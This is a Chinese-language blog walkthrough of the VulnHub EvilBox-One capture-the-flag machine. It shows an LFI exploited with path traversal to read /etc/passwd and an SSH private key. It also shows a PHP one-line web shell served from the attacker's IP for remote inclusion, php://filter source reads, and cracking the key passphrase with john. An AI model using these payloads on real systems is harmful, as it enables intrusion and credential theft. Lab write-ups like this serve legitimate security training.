@@ -1,0 +1,261 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> VulnHub-6-EvilBox-one · Patrik's Blog</title><meta name="description" content="VulnHub-6-EvilBox-one - Patrik"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://example.com/atom.xml" title="Patrik's Blog"><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Patrik's Blog" type="application/atom+xml">
+</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="http://www.bing.com" target="_blank" class="nav-list-link">WEIBO</a></li><li class="nav-list-item"><a href="https://github.com/byesec" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">VulnHub-6-EvilBox-one</h1><div class="post-info">2022年4月12日</div><div class="post-content"><blockquote>
+<p>靶机：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/evilbox/EvilBox---One.ova">https://download.vulnhub.com/evilbox/EvilBox---One.ova</a><br>  难度：低→中<br>  目标：取得 root 权限 + 2 Flag</p>
+</blockquote>
+<span id="more"></span>
+<h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig </span><br><span class="line">#本机IP:192.168.0.110 攻击机IP</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208193627499-20220106215922469-20220106220051089-20220106221119106.png" alt="image-20211208193627499"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -gaq 192.168.0.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208195647496.png" alt="image-20211208195647496"></p>
+<p>探测到的存活主机列表中，192.168.0.108是目标靶机的IP地址</p>
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.0.108</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208195931120.png" alt="image-20211208195931120"></p>
+<p>目标靶机开放了22，80端口</p>
+<h3 id="3-端口服务探测"><a href="#3-端口服务探测" class="headerlink" title="3.端口服务探测"></a>3.端口服务探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22,80 -A 192.168.0.108</span><br><span class="line"># -A参数的作用大致等于-sV -sC -O,比较方便</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208200300990.png" alt="image-20211208200300990"></p>
+<p>扫描结果显示目标靶机的</p>
+<p>22端口开放了ssh服务，并列举了些不同方式加密的密钥信息</p>
+<p>80端口开放了Apache的Web服务，Debian操作系统</p>
+<h3 id="4-访问80端口"><a href="#4-访问80端口" class="headerlink" title="4.访问80端口"></a>4.访问80端口</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208200757525.png" alt="image-20211208200757525"></p>
+<p>只是一个简单的Apache页面，未发现有用信息</p>
+<h3 id="5-爆破22端口"><a href="#5-爆破22端口" class="headerlink" title="5.爆破22端口"></a>5.爆破22端口</h3><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208201510674.png" alt="image-20211208201510674"></p>
+<p>对22端口root用户的密码进行了爆破 但最终无果</p>
+<h3 id="6-目录扫描"><a href="#6-目录扫描" class="headerlink" title="6.目录扫描"></a>6.目录扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.0.108 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,jsp,html</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208204109760.png" alt="image-20211208204109760"></p>
+<p>发现的目录&#x2F;文件有 index.html,robots.txt,secret 分别尝试：</p>
+<h4 id="1-ip-x2F-index-html"><a href="#1-ip-x2F-index-html" class="headerlink" title="1)ip&#x2F;index.html"></a>1)ip&#x2F;index.html</h4><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208203719626.png" alt="image-20211208203719626"></p>
+<p>主页亦是先前的80端口默认页面..</p>
+<h4 id="2-ip-x2F-robots-txt"><a href="#2-ip-x2F-robots-txt" class="headerlink" title="2)ip&#x2F;robots.txt"></a>2)ip&#x2F;robots.txt</h4><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208201957960.png" alt="image-20211208201957960"></p>
+<p>页面内显示了“Hello H4x0r”，怀疑是否是用户名或者路径，尝试针对用户名H4x0r的ssh密码爆破，结果失败..</p>
+<p>尝试访问ip&#x2F;H4x0r结果也是失败..</p>
+<h4 id="3-ip-x2F-secret"><a href="#3-ip-x2F-secret" class="headerlink" title="3)ip&#x2F;secret"></a>3)ip&#x2F;secret</h4><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208203843733.png" alt="image-20211208203843733"></p>
+<p>访问后发现是个空目录，查看源码也没有任何信息..</p>
+<p>再对ip&#x2F;secret下的目录进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.0.108/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,jsp,html</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208204358197.png" alt="image-20211208204358197"></p>
+<p>发现了&#x2F;secret目录下的index.html，evil.php 分别尝试：</p>
+<h4 id="4-ip-x2F-secret-x2F-index-html"><a href="#4-ip-x2F-secret-x2F-index-html" class="headerlink" title="4)ip&#x2F;secret&#x2F;index.html"></a>4)ip&#x2F;secret&#x2F;index.html</h4><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208204647211.png" alt="image-20211208204647211"></p>
+<p>空白😱..</p>
+<h4 id="5-ip-x2F-secret-x2F-evil-php"><a href="#5-ip-x2F-secret-x2F-evil-php" class="headerlink" title="5)ip&#x2F;secret&#x2F;evil.php"></a>5)ip&#x2F;secret&#x2F;evil.php</h4><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208204721125.png" alt="image-20211208204721125"></p>
+<p>空白😱..</p>
+<p>截止到目前，还没有任何直接的发现，停留在此..😮‍💨</p>
+<h3 id="7-绝境的求救信–php参数爆破"><a href="#7-绝境的求救信–php参数爆破" class="headerlink" title="7.绝境的求救信–php参数爆破"></a>7.绝境的求救信–php参数爆破</h3><p>思考🤔：php页面是如何向服务器端提交数据的呢？</p>
+<p>Emm:通过一些参数赋值</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.0.108/secret/evil.php?**a=123&amp;b=456">http://192.168.0.108/secret/evil.php?**a=123&amp;b=456</a>**</p>
+<p>回忆🤔：平时做攻击、注入等时的大致步骤都是，在URL先寻找参数名称，再尝试写入payload完成注入，包括使用POST方法也是寻找参数在body里寻找数据注入</p>
+<p>💊得救的关键就是–&gt;<strong>寻找正确的参数</strong>–&gt;<strong>参数爆破</strong>！！！💣</p>
+<p>确定目标：</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.0.108/secret/evil.php?**cs**=**csz">http://192.168.0.108/secret/evil.php?**cs**=**csz</a>**</p>
+<p>对<strong>参数名位置</strong>(cs)和<strong>参数值位置</strong>(csz)</p>
+<p>工具选择：</p>
+<p>第一反应是bp，但是这里为了拓展武器选择使用ffuf</p>
+<p>字典选择：</p>
+<p>​	针对参数名选择burp-parameter-names.txt</p>
+<p>​	针对参数值选择DIY大法🐸</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi DIY.txt #放入一些数字、字母、符号</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat DIY.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208211435869.png" alt="image-20211208211435869"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:cs -w DIY.txt:csz -u http://192.168.0.108/secret/evil.php?cs=csz -fs 0</span><br><span class="line">#-w分别指定两个字典  </span><br><span class="line">#:为了区分字典，指定参数</span><br><span class="line">#-fs 0 过滤掉无效信息（返回页面为空 0），使结果更清晰易读</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208213846947.png" alt="image-20211208213846947"></p>
+<p>结果很不理想..😫</p>
+<p>分析一下：</p>
+<p>刚才的参数名字典中应该是涵盖了大部分常用参数名 应该不存在直接问题✅</p>
+<p>刚才的赋值字典是手动输入了几个字母、数字、符号 怀疑是这里掉了链子❌</p>
+<p>稍微变换一下思路：</p>
+<p>在参数名的位置仍使用burp-parameter-names.txt字典，参数值的位置放置一个目标靶机上<strong>已经确定存在的文件</strong>，当在爆破参数名的过程中若出现了一个可用的参数名时，那么该参数便会引用该<strong>已经确定存在的文件</strong>，是否有可能利用文件包含读取文件的信息？</p>
+<p>结合之前的目录扫描，不难想到这个<strong>已经确定存在的文件</strong>不就是<strong>index.html</strong>吗？</p>
+<p>重新构建：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.0.108/secret/evil.php?FUZZ=../index.html -fs 0</span><br><span class="line">#取消参数值的字典 替换为../index.html</span><br><span class="line">#FUZZ模糊测试关键字</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208213756058.png" alt="image-20211208213756058"></p>
+<p>结果显示：参数名称command可用</p>
+<p>测试访问<a target="_blank" rel="noopener" href="http://192.168.0.108/secret/evil.php?command=../index.html">http://192.168.0.108/secret/evil.php?command=../index.html</a></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208214129645.png" alt="image-20211208214129645"></p>
+<p>可以正常访问</p>
+<p>测试访问<a target="_blank" rel="noopener" href="http://192.168.0.108/secret/evil.php?command=evil.php">http://192.168.0.108/secret/evil.php?command=evil.php</a></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208214243394.png" alt="image-20211208214243394"></p>
+<p>访问结果仍为空白页面，查看源码为1行空白</p>
+<p>测试是否存在文件包含漏洞</p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.0.108/secret/evil.php?command=../../../../../../../../etc/passwd">http://192.168.0.108/secret/evil.php?command=../../../../../../../../etc/passwd</a></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208214549193.png" alt="image-20211208214549193"></p>
+<p>结果成功读取&#x2F;etc&#x2F;passwd，说明存在文件包含漏洞</p>
+<h3 id="8-远程文件包含"><a href="#8-远程文件包含" class="headerlink" title="8.远程文件包含"></a>8.远程文件包含</h3><p>尝试在kali攻击机上构造一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi a.php</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<?php $var=shell_exec($_GET['cmd']); echo $var?>
+</blockquote>
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208215246492.png" alt="image-20211208215246492"></p>
+<p>利用远程文件包含上传</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start apache2 #在kali本机开启web服务 可在执行后 使目标可以访问到a.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208215647665.png" alt="image-20211208215647665"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=http://192.168.0.110/a.php?cmd=id</span><br><span class="line">#尝试执行id命令</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208220144981.png" alt="image-20211208220144981"></p>
+<p>并没有返回，尝试了ls等其他命令也没有返回，说明此处利用远程文件包含是行不通的</p>
+<h3 id="9-php封装器"><a href="#9-php封装器" class="headerlink" title="9.php封装器"></a>9.php封装器</h3><p>php作为一种语言，提供许多其他协议的访问方式、许多封装器，例如php:&#x2F;&#x2F; file:&#x2F;&#x2F; ftp:&#x2F;&#x2F; data:&#x2F;&#x2F; zip:&#x2F;&#x2F;</p>
+<p>利用php:&#x2F;&#x2F;来读取目标系统上的php文件（当访问目标服务器上的php文件时，目标服务器会使用php执行代码来处理该文件，故往往读取不到php文件的源码，读到的只是代码执行后返回的结果。但若是先使用base64进行编码后，目标服务器无法正常读取可识别的代码，不但不会执行该代码，反而会返回被base64编码后的字符串）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208221355954.png" alt="image-20211208221355954"></p>
+<p>成功返回base64编码的字符串（evil.php源码）</p>
+<blockquote>
+<p>PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg&#x3D;&#x3D;</p>
+</blockquote>
+<p>base64解码后：</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208221618439.png" alt="image-20211208221618439"></p>
+<blockquote>
+<?php
+$filename = $_GET['command'];   #读取赋值
+include($filename);             #引用读取到的赋值
+?>
+</blockquote>
+<p>测试向目标写入能否成功，可能没有写入的权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n 123 | base64       #得到123经过base64编码的字符</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208222226443.png" alt="image-20211208222226443"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=php://filter/write=convert.base64-decode/resource=test.php&amp;txt=MTIz</span><br><span class="line">#利用php://封装器将MTIz解码后写入名为test.php的文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208222639627.png" alt="image-20211208222639627"></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208222705794.png" alt="image-20211208222705794"></p>
+<p>访问失败 说明刚才的写入操作失败了..再次陷入僵局..</p>
+<h3 id="10-mowree"><a href="#10-mowree" class="headerlink" title="10.mowree?"></a>10.mowree?</h3><p>又重新翻看了之前搜集到的信息，发现在&#x2F;etc&#x2F;passwd目录下，存在一个名为mowree的用户</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208223113476.png" alt="image-20211208223113476"></p>
+<p>只有用户名，那么是否可以再尝试一下ssh登陆密码爆破？</p>
+<p>先确认一下ssh登陆的认证方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mowree@192.168.0.108 -v</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208223554832.png" alt="image-20211208223554832"></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208223639905.png" alt="image-20211208223639905"></p>
+<p>结果显示目标支持password密码认证以外，还支持publickey公钥身份认证</p>
+<p>那么联想到 一个能够登陆该服务器的的用户必然存在其登陆所用的公钥,那么该公钥文件位于哪里呢？</p>
+<p>是否存在于用户目录文件下呢？结合利用文件包含读文件！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=../../../../../home/mowree/.ssh/authorized_keys</span><br><span class="line">#.ssh/authorized_keys 已经授权的用户的默认公钥存储路径</span><br></pre></td></tr></table></figure>
+
+<p>如果能够读取到则说明服务器是已授权允许该用户登陆的</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208225112071.png" alt="image-20211208225112071"></p>
+<p>成功读取到存放在目标用户mowree目录下的公钥</p>
+<blockquote>
+<p>ssh-rsa  AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud&#x2F;knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV&#x2F;QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH&#x2F;XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne</p>
+</blockquote>
+<p>页面返回信息：公私钥生成使用RSA算法、用户mowree登录到EvilBoxOne</p>
+<p>既然已经被授权–存在公钥–那么是否也应该在默认目录下存在私钥呢？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=../../../../../home/mowree/.ssh/id_rsa</span><br><span class="line">#.ssh/id_rsa 已经授权的用户的默认私钥存储路径</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208225724998.png" alt="image-20211208225724998"></p>
+<p>成功读取到目标用户mowree目录下的私钥(右键源码 格式更佳！)</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&gt;-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">&gt;Proc-Type: 4,ENCRYPTED</span><br><span class="line">&gt;DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E</span><br><span class="line"></span><br><span class="line">&gt;uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6</span><br><span class="line">&gt;hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe</span><br><span class="line">&gt;o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb</span><br><span class="line">&gt;+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot</span><br><span class="line">&gt;b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k</span><br><span class="line">&gt;HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg</span><br><span class="line">&gt;9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY</span><br><span class="line">&gt;zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu</span><br><span class="line">&gt;rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1</span><br><span class="line">&gt;tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs</span><br><span class="line">&gt;94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm</span><br><span class="line">&gt;VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7</span><br><span class="line">&gt;Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P</span><br><span class="line">&gt;hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr</span><br><span class="line">&gt;Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR</span><br><span class="line">&gt;IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R</span><br><span class="line">&gt;MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS</span><br><span class="line">&gt;62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69</span><br><span class="line">&gt;Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8</span><br><span class="line">&gt;p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C</span><br><span class="line">&gt;pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X</span><br><span class="line">&gt;KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa</span><br><span class="line">&gt;i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp</span><br><span class="line">&gt;4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/</span><br><span class="line">&gt;8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==</span><br><span class="line">&gt;-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="11-手握公私钥尝试登陆"><a href="#11-手握公私钥尝试登陆" class="headerlink" title="11.手握公私钥尝试登陆"></a>11.手握公私钥尝试登陆</h3><p>清点一下：</p>
+<p>服务器支持公钥的认证方式–用户的目录下存在公钥–服务器允许用户mowree使用公钥登陆–拿取到了私钥–拥有私钥的任何用户都可以使用私钥尝试登陆服务器–不需要账号密码–利用公钥证明身份</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi id_rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208231311174.png" alt="image-20211208231311174"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208231920190.png" alt="image-20211208231920190"></p>
+<p>使用私钥ssh登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mowree@192.168.0.108 -i id_rsa </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208232318351.png" alt="image-20211208232318351"></p>
+<p>再遇密码..没完没了..</p>
+<h3 id="12-爆破狂人约翰"><a href="#12-爆破狂人约翰" class="headerlink" title="12.爆破狂人约翰"></a>12.爆破狂人约翰</h3><p>霸王硬上弓–&gt;爆破💣–&gt;选择一本足够强大的字典📖</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/wordlists/rockyou.txt.gz . </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip rockyou.txt.gz</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208232910798.png" alt="image-20211208232910798"></p>
+<p>使用john前，需将私钥转换为该工具可以使用爆破的格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/john</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ssh2john.py ~/id_rsa &gt; ~/hash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208233910653.png" alt="image-20211208233910653"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john hash --wordlist=rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208234313571.png" alt="image-20211208234313571"></p>
+<p>爆破结果得到的密码为：unicorn</p>
+<p>胸有成竹的进行登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mowree@192.168.0.108 -i id_rsa </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208234716317.png" alt="image-20211208234716317"></p>
+<p>终于突破了边界 获取到了第一个flag 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p>
+<p>另外一个flag应该是需要root用户才能拿到的</p>
+<h3 id="13-提权冲锋🐛"><a href="#13-提权冲锋🐛" class="headerlink" title="13.提权冲锋🐛"></a>13.提权冲锋🐛</h3><p>尝试提权</p>
+<h4 id="1-查看当前有无计划任务"><a href="#1-查看当前有无计划任务" class="headerlink" title="1)查看当前有无计划任务"></a>1)查看当前有无计划任务</h4><p>利用脚本就…</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l    </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208235115298.png" alt="image-20211208235115298"></p>
+<p>并没有😖</p>
+<h4 id="2-查看sudo权限配置方面有无缺陷"><a href="#2-查看sudo权限配置方面有无缺陷" class="headerlink" title="2)查看sudo权限配置方面有无缺陷"></a>2)查看sudo权限配置方面有无缺陷</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l       	</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208235258827.png" alt="image-20211208235258827"></p>
+<p>并没有😖</p>
+<h4 id="3-查看内核是否存在漏洞"><a href="#3-查看内核是否存在漏洞" class="headerlink" title="3)查看内核是否存在漏洞"></a>3)查看内核是否存在漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a      </span><br></pre></td></tr></table></figure>
+
